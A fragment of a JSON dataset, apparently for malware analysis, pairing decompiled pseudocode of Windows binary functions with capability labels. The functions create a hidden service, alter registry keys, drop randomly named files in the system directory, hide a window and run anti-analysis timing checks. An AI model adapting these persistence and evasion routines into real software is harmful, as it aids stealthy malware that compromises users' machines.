        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403df4) overlaps instruction at (ram,0x00403def)\n// \n// WARNING: Removing unreachable block (ram,0x00403de2)\n// WARNING: Removing unreachable block (ram,0x00403df4)\n// WARNING: Removing unreachable block (ram,0x00403de8)\n// WARNING: Removing unreachable block (ram,0x00403dee)\n// WARNING: Removing unreachable block (ram,0x00403df7)\n// WARNING: Removing unreachable block (ram,0x00403dfe)\n// WARNING: Removing unreachable block (ram,0x00403e00)\n\nuchar fcn.00403d80(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00402e00(*0x10 + -8);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 209
    },
    "004041b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041cc) overlaps instruction at (ram,0x004041cb)\n// \n// WARNING: Removing unreachable block (ram,0x004041f6)\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.004041b0(uint8_t *param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    char *pcVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint8_t *unaff_EBX;\n    uchar *unaff_ESI;\n    uint *puVar6;\n    uint8_t in_AF;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    if ((&var_80h < 0) || (&var_80h >= 0)) {\n        iVar5 = fcn.00401a00();\n        if (iVar5 != 0) {\n            fcn.00401950();\n            iVar5 = fcn.00403c80(0x40fed8);\n            if (iVar5 != -1) {\n                iVar5 = fcn.00403c80(0x40fecc);\n                if (iVar5 == -1) {\n                    fcn.00404360();\n                }\n                return false;\n            }\n            fcn.00402990();\n            iVar5 = fcn.004030c0();\n            if (iVar5 == 0) {\n                var_20h = 0;\n                var_80h._0_1_ = 0;\n                puVar6 = &var_1fh;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                *puVar6 = 0;\n                *(puVar6 + 2) = 0;\n                var_60h._0_1_ = 0;\n                puVar6 = &var_80h + 1;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                *puVar6 = 0;\n                *(puVar6 + 2) = 0;\n                var_40h._0_1_ = 0;\n                puVar6 = &var_60h + 1;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                *puVar6 = 0;\n                *(puVar6 + 2) = 0;\n                puVar6 = &var_40h + 1;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                *puVar6 = 0;\n                *(puVar6 + 2) = 0;\n                iVar5 = fcn.00404680(&var_80h, &var_60h, &var_20h, &var_40h);\n                if (iVar5 != 0) {\n                    iVar5 = fcn.00403e30(&var_20h);\n                    if (iVar5 != 0) {\n                        iVar5 = fcn.00401ec0(&var_80h, &var_60h, &var_20h, &var_40h);\n                        return iVar5 != 0;\n                    }\n                    return false;\n                }\n                return false;\n            }\n            return false;\n        }\n        fcn.00404360();\n    }\n    else {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        uVar2 = 9 < (unaff_ESI & 0xf) | in_AF;\n        uVar4 = unaff_ESI + uVar2 * -6;\n        uVar1 = *param_1;\n        *param_1 = uVar4 + (0x9f < uVar4 | unaff_ESI < &stack0xfffffffc | uVar2 * (uVar4 < 6)) * -0x60;\n        pcVar3 = unaff_ESI & 0xffffff00 | uVar1;\n        *pcVar3 = *pcVar3 + uVar1;\n    }\n    return false;\n}\n",
        "token_count": 1023
    },
    "00404360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.00404360(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00404c90();\n    puStack296 = 0x4043aa;\n    fcn.004047e0(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x4043c4;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x4043d7;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x41e3c0;\n    uStack312 = 0x4101cc;\n    uStack316 = 0x80000000;\n    uStack320 = 0x4043f7;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x410200;\n    uStack328 = 1;\n    uStack332 = 0x41e3c0;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x41024c, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x410288, 1, 0x410290, 0x14);\n    return;\n}\n",
        "token_count": 656
    },
    "004047e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004047e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00404b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b80(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00402210();\n        fcn.004041b0();\n        if (*0x41e3d0 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404480();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 139
    },
    "00404bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404c11) overlaps instruction at (ram,0x00404c10)\n// \n\nuint32_t __cdecl fcn.00404bf0(uint32_t arg_8h)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t in_CL;\n    ushort in_DX;\n    int32_t unaff_EBX;\n    uint *unaff_EDI;\n    bool in_ZF;\n    \n    if (!in_ZF) {\n        if (in_ZF) {\n            uVar2 = in(in_DX);\n            *unaff_EDI = uVar2;\n            if (&stack0xfffffffc < 1) {\n                pcVar1 = (in_EAX & 0xffffff51) + 2;\n                *pcVar1 = *pcVar1 + (unaff_EBX >> 8);\n                return (in_EAX & 0xffffff51) + 1;\n            }\n            goto code_r0x00404c09;\n        }\n    }\n    unaff_EDI = 0x1;\n    in_EAX = arg_8h;\ncode_r0x00404c09:\n    uVar3 = in_EAX ^ 0xdee0ed6d;\n    *(unaff_EBX + 0x16a0845) = *(unaff_EBX + 0x16a0845) ^ in_CL;\n    iVar4 = fcn.00402f40(uVar3 & 0xffff0000 | uVar3 + (uVar3 >> 8) * -0x31, unaff_EDI);\n    return iVar4 != 0;\n}\n",
        "token_count": 379
    },
    "00404c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404c90(void)\n\n{\n    uint uVar1;\n    \n    if (*0x41e3d4 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41e3d4 = 1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00401210": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401210(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EDI;\n    float10 in_ST0;\n    uint var_8h;\n    uint hKey;\n    \n    var_8h = 1;\n    if ((-1 < &var_8h) && (-1 >= &var_8h)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        uVar2 = var_8h;\n        if (iVar1 != 0) {\n            uVar2 = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 289
    },
    "00403100": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403100(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00404c30": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404c30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x406010, 0x41e3c0, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 141
    },
    "004018d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401930) overlaps instruction at (ram,0x0040192e)\n// \n\nvoid __thiscall fcn.004018d0(uint32_t param_1, uint param_2, uint param_3, int32_t param_4, int32_t param_5)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t unaff_EBX;\n    uchar *puVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    uchar *puStack20;\n    \n    puVar5 = &stack0xfffffffc;\n    uVar6 = 0;\n    if (0 < param_5) {\n        do {\n            uVar4 = param_1 & 0xffffff00;\n            uVar1 = *(puVar5 + 8);\n            uVar3 = *(uVar6 + param_4) ^ *(uVar6 % *(puVar5 + 0xc) + uVar1);\n            puVar5[0x13] = uVar3;\n            bVar7 = unaff_EBX + 1 < 0;\n            if (SCARRY4(unaff_EBX, 1) == bVar7) {\n                uVar4 = param_1 & 0xff00 | uVar3;\n                puStack20 = uVar1 & 0xffff | uVar4 << 0x10;\n                if (SCARRY4(unaff_EBX, 1) == bVar7) goto code_r0x00401930;\n                param_1 = uVar4 + *(uVar6 % *(puVar5 + 0xc) + -0x7734cd38) + (0x75 < uVar6);\n                uVar2 = uVar6 & 0xffffff00 | uVar6 + 0x8a | 0x3e;\n                puVar5 = puStack20;\n                uVar6 = uVar1;\n            }\n            else {\ncode_r0x00401930:\n                uVar2 = *(puVar5 + 0x14);\n                unaff_EBX = unaff_EBX & 0xffffff00 | puVar5[0x13];\n                param_1 = uVar4 & 0xffffff00;\n                *(uVar6 + param_4) = uVar2 ^ puVar5[0x13];\n            }\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < uVar2);\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "00404680": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004046c1) overlaps instruction at (ram,0x004046bf)\n// \n// WARNING: Removing unreachable block (ram,0x004046ac)\n// WARNING: Removing unreachable block (ram,0x004046b2)\n// WARNING: Removing unreachable block (ram,0x004046b3)\n// WARNING: Removing unreachable block (ram,0x004046bb)\n\nuint32_t __cdecl fcn.00404680(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar3;\n    uint8_t *unaff_EBX;\n    uint *puVar4;\n    bool bVar5;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    bVar5 = false;\n    puVar4 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_8h = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00404c90();\n    if ((!bVar5) && (bVar5)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n    // WARNING: Could not recover jumptable at 0x004046db. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**0x4)();\n        return uVar2;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401600();\n        arg_ch_01 = fcn.00401600();\n        arg_ch_02 = fcn.00401600();\n        fcn.004047e0(arg_10h, arg_ch_00);\n        fcn.004047e0(arg_8h, arg_ch_01);\n        fcn.004047e0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x40fe88, &lpBuffer, arg_10h);\n        iVar3 = fcn.00404b20(&var_314h);\n        if (iVar3 != 0) {\n            (*pcVar1)(&var_210h, 0x40fe94, &lpBuffer, arg_8h);\n            iVar3 = fcn.00404b20(&var_210h);\n            if (iVar3 != 0) {\n                (*pcVar1)(&var_210h, 0x40fe94, &lpBuffer, arg_ch);\n                iVar3 = fcn.00404b20(&var_210h);\n                if (iVar3 != 0) {\n                    iVar3 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar3 = var_8h;\n    } while (var_4h < 3);\n    fcn.004047e0(arg_14h, 4);\n    return iVar3 != 0;\n}\n",
        "token_count": 823
    },
    "00404830": {
        "rules": [
            "contain loop",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040488a) overlaps instruction at (ram,0x00404888)\n// \n\nuint __cdecl fcn.00404830(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    char cVar3;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    char *pcVar4;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    uint8_t uVar5;\n    bool bVar6;\n    uint8_t in_AF;\n    ulong uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    uVar8 = 0x40486b;\n    uVar7 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    pcVar4 = uVar7 >> 0x20;\n    uVar2 = uVar7;\n    uVar5 = 0;\n    bVar6 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 != 0) {\n        uVar9 = uVar2;\n        if ((bVar6) && (!bVar6)) {\n            out(*unaff_ESI, uVar7 >> 0x20);\n            uVar5 = in_AF;\n            do {\n                cVar3 = uVar2 >> 8;\n                uVar5 = 9 < (uVar2 & 0xf) | uVar5;\n                uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar3 - uVar5), -uVar5);\n                uVar9 = uVar8 & 0xffff | unaff_ESI << 0x10;\n            } while (uVar5 || cVar3 == *pcVar4);\n        }\n        piVar1 = unaff_EDI + pcVar4 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - uVar5;\n        *(extraout_ECX + 0x50) = uVar2;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar9);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 546
    },
    "00401950": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401950(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x41e3c4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x40ff78);\n    *0x41e3c8 = (*pcVar1)(iVar2, 0x40ff94);\n    *0x41e3cc = (*pcVar1)(iVar2, 0x40ffa4);\n    if (((*0x41e3c4 != 0) && (*0x41e3c8 != 0)) && (*0x41e3cc != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 230
    },
    "00404450": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404450(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x410068, 0x4100ac, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}